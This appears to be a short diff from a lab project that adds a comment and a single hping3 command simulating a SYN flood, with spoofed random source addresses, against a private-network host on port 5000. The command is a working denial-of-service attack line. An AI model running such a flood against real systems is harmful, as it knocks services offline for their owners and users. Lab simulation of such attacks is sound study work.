@@ -1,0 +1,2 @@
+#Simulate the SYN flooding attack using hping3 from a virtual machine(Ubuntu)  
+sudo hping3 -S --flood --rand-source -p 5000 192.168.1.20#This address is the IP of the attacked host machine
